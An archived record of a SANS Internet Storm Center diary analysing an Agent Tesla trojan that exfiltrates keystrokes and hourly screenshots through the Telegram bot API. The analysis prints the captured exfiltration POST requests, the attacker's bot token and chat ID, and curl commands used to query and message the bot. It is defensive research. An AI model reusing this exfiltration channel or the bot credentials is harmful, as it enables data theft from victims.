{
    "id": "0beb165f-8b8a-49ba-b0a6-5aee2e2e3681",
    "created_at": "2023-01-12T15:03:09.825601Z",
    "updated_at": "2025-03-27T02:06:05.106753Z",
    "deleted_at": null,
    "sha1_hash": "295d5b53ac27aced2a8e06211a462c5e22de6858",
    "title": "2021-07-24 - Agent.Tesla Dropped via a .daa Image and Talking to Telegram",
    "authors": "",
    "file_creation_date": "2022-05-28T15:58:01Z",
    "file_modification_date": "2022-05-28T15:58:01Z",
    "file_size": 443863,
    "plain_text": "# SANS ISC: InfoSec Handlers Diary Blog - SANS Internet Storm Center SANS Site Network Current Site SANS Internet Storm Center Other SANS Sites Help Graduate Degree Programs Security Training Security Certification Security Awareness Training Penetration Testing Industrial Control Systems Cyber Defense Foundations DFIR Software Security Government OnSite Training InfoSec Handlers Diary Blog\n\n**isc.sans.edu/diary/27666**\n\n## Agent.Tesla Dropped via a .daa Image and Talking to Telegram\n\n### Published: 2021-07-24\n Last Updated: 2021-07-24 06:47:29 UTC\n by Xavier Mertens (Version: 1)\n 0 comment(s) A few days ago, I found an interesting file delivered by email (why change a winning combination?). The file has a nice extension: “.daa” (Direct Access Archive). We already reported such files in 2019 and Didier wrote a diary[1] about them. Default Windows installation, can’t process “.daa” files, you need a specific tool to open them (like PowerISO). I converted the archive into an ISO file and extracted the PE file inside it.\n\n The sample was called “E445333###.exe” (SHA256:853a7edf8144e06014e0c1a841d1f1840de954a866d5ce73ff12833394ff0ead) and has a VT score of 48/70[2]. It’s a classic Agent.Tesla but this one uses another C2 channel to exfiltrate data. Instead of using open email servers, it uses Telegram (the messenger application). I started to debug the PE file (a classic .Net executable) but it took a lot of time before reaching some interesting activity so I took another approach and went back to a classic behavioral analysis. I fired a REM Workstation, connected it to the Internet through a REMnux, and launched the executable.\n\n It took some time (approx 15 mins) before I saw the first connection to api[.]telegram[.]org:\n\n\n-----\n\n```\nPOST hxxps://api[.]telegram[.]org/bot1815802853:AAFwTZ6mRU\nUOmcTcCR8glZAAkNmzHpMkL8/sendDocument HTTP/1.1\nContent-Type: multipart/form-data; boundary=--------------------------8d94d2d30eed79c\nHost: api.telegram.org\nContent-Length: 983\nExpect: 100-continue\nConnection: Keep-Alive\n-----------------------------8d94d2d30eed79c\nContent-Disposition: form-data; name=\"chat_id\"\n1599705393\n-----------------------------8d94d2d30eed79c\nContent-Disposition: form-data; name=\"caption\"\nNew Log Recovered!\nUser Name: REM/DESKTOP-2C3IQHO\nOSFullName: Microsoft Windows 10 Enterprise\nCPU: Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz\nRAM: 8191.49 MB\n-----------------------------8d94d2d30eed79c\nContent-Disposition: form-data; name=\"document\"; filename=\"REM-DESKTOP-2C3IQHO 202107-22 04-24-32.html\"\nContent-Type: text/html\nTime: 07/22/2021 16:24:31<br>User Name: REM<br>Computer Name: DESKTOP2C3IQHO<br>OSFullName: Microsoft Windows 10 Enterprise<br>CPU: Intel(R) Core(TM) i99980HK CPU @ 2.40GHz<br>RAM: 8191.49 MB<br>IP Address: <br><hr><br><font\ncolor=\"#00b1ba\"><b>[ Process Hacker: </b>Filter <b>]</b> <font color=\"#000000\">\n(07/22/2021 16:01:01)</font></font><br>api<font color=\"#00ba66\">{ENTER}</font><br>\n-----------------------------8d94d2d30eed79c-\n### And the reply:\nHTTP/1.1 200 OK\nServer: nginx/1.18.0\nDate: Thu, 22 Jul 2021 14:24:34 GMT\nContent-Type: application/json\nContent-Length: 662\nConnection: keep-alive\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Expose-Headers: Content-Length,Content-Type,Date,Server,Connection\n{\"ok\":true,\"result\":{\"message_id\":6630,\"from\":\n{\"id\":1815802853,\"is_bot\":true,\"first_name\":\"Bigdealz\",\"username\":\"Bigdealzbot\"},\"chat\n{\"id\":1599705393,\"first_name\":\"Gracia\",\"last_name\":\"Smith\",\"username\":\"Graciasmith1\",\"\n{\"file_name\":\"REM-DESKTOP-2C3IQHO 2021-07-22 04-2432.html\",\"mime_type\":\"text/html\",\"file_id\":\"BQACAgQAAxkDAAIZ5mD5f6KNxerk3Fq4TG00ctuw4K\n Log Recovered!\\n\\nUser Name: REM/DESKTOP-2C3IQHO\\nOSFullName: Microsoft Windows 10\nEnterprise\\nCPU: Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz\\nRAM: 8191.49 MB\"}}\n\n```\n\n-----\n\n### A few minutes later, the Trojan started to exfiltrate screenshots:\n```\nPOST hxxps://api[.]telegram[.]org/bot1815802853:AAFwTZ6mRUUOmcTcCR8glZAAkNmzHpMkL8/sendDocument HTTP/1.1\nContent-Type: multipart/form-data; boundary=--------------------------8d94d3662696c53\nHost: api.telegram.org\nContent-Length: 194635\nExpect: 100-continue\nConnection: Keep-Alive\n-----------------------------8d94d3662696c53\nContent-Disposition: form-data; name=\"chat_id\"\n1599705393\n-----------------------------8d94d3662696c53\nContent-Disposition: form-data; name=\"caption\"\nNew Screenshot Recovered!\nUser Name: REM/DESKTOP-2C3IQHO\nOSFullName: Microsoft Windows 10 Enterprise\nCPU: Intel(R) Core(TM) i9-9980HK CPU @ 2.40GHz\nRAM: 8191.49 MB\n-----------------------------8d94d3662696c53\nContent-Disposition: form-data; name=\"document\"; filename=\"REM-DESKTOP-2C3IQHO 202107-22 05-30-21.jpeg\"\nContent-Type: image/jpeg\nJFIF``C\n(1#%(:3=\n<9387@H\\N@DWE78PmQW_bghg>Mqypdx\\egcC//cB8Bcccccccccccccccccccccccccccccccccccccccccccc\n[stuff deleted]\n\n The file that is uploaded contains a timestamp. This confirmed to me that a screenshot is exfiltrated every hour.\n\n```\n\n-----\n\n### Because we know the bot ID, we can interact with it.\n\n Let’s check the bot info:\n```\nremnux@remnux:~$ curl -s hxxps://api[.]telegram[.]org/bot1815802853:AAFwTZ6mRUUOmcTcCR8glZAAkNmzHpMkL8/getMe | jq\n{\n \"ok\": true,\n \"result\": {\n  \"id\": 1815802853,\n  \"is_bot\": true,\n  \"first_name\": \"Bigdealz\",\n  \"username\": \"Bigdealzbot\",\n  \"can_join_groups\": true,\n  \"can_read_all_group_messages\": false,\n  \"supports_inline_queries\": false\n }\n}\n\n The user the bot is talking to is \"Graciasmith1\" (still online on Telegram when I'm writing this diary). Let's make it aware that we are also alive:\n\n```\n\n-----\n\n```\nremnux@remnux: $ curl s hxxps://api[.]telegram[.]org/bot1815802853:AAFwTZ6mRU\nUOmcTcCR8glZAAkNmzHpMkL8/sendMessage -X POST -d '{\"chat_id\":\"1599705393\",\n\"text\":\"Ping\"}' -H \"Content-Type: application/json\" | jq\n{\n \"ok\": true,\n \"result\": {\n  \"message_id\": 6884,\n  \"from\": {\n   \"id\": 1815802853,\n   \"is_bot\": true,\n   \"first_name\": \"Bigdealz\",\n   \"username\": \"Bigdealzbot\"\n  },\n  \"chat\": {\n   \"id\": 1599705393,\n   \"first_name\": \"Gracia\",\n   \"last_name\": \"Smith\",\n   \"username\": \"Graciasmith1\",\n   \"type\": \"private\"\n  },\n  \"date\": 1627107886,\n  \"text\": \"Ping\"\n }\n}\n\n### As you can see, today it's very touchy to spot malicious activity just by watching classic IOCs like IP addresses or domain names. Except if you prevent your users to access social networks like Telegram, who will flag traffic to api.telegram.org as suspicious? Behavioral monitoring can be the key: You can see requests at regular intervals, outside business hours, or from hosts that should not execute social network applications. Because your servers can access the Internet directly, right? ;-)\n\n [1] https://isc.sans.edu/forums/diary/The+DAA+File+Format/25246\n [2] https://www.virustotal.com/gui/file/853a7edf8144e06014e0c1a841d1f1840de954a866d5ce73 ff12833394ff0ead/detection\n\n Xavier Mertens (@xme) Senior ISC Handler - Freelance Cyber Security Consultant PGP Key\n\n Keywords: API Bot Telegram Malware Trojan 0 comment(s)\n\n```\nJoin us at SANS! Attend Reverse-Engineering Malware: Malware Analysis Tools and\n### Techniques with Xavier Mertens in Amsterdam starting Aug 15 2022\n\n Top of page\n\n\n-----\n\n### ×\n\n Diary Archives\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-07-24 - Agent.Tesla Dropped via a .daa Image and Talking to Telegram.pdf"
    ],
    "report_names": [
        "2021-07-24 - Agent.Tesla Dropped via a .daa Image and Talking to Telegram.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535789,
    "ts_updated_at": 1743041165,
    "ts_creation_date": 1653753481,
    "ts_modification_date": 1653753481,
    "files": {
        "pdf": "https://archive.orkl.eu/295d5b53ac27aced2a8e06211a462c5e22de6858.pdf",
        "text": "https://archive.orkl.eu/295d5b53ac27aced2a8e06211a462c5e22de6858.txt",
        "img": "https://archive.orkl.eu/295d5b53ac27aced2a8e06211a462c5e22de6858.jpg"
    }
}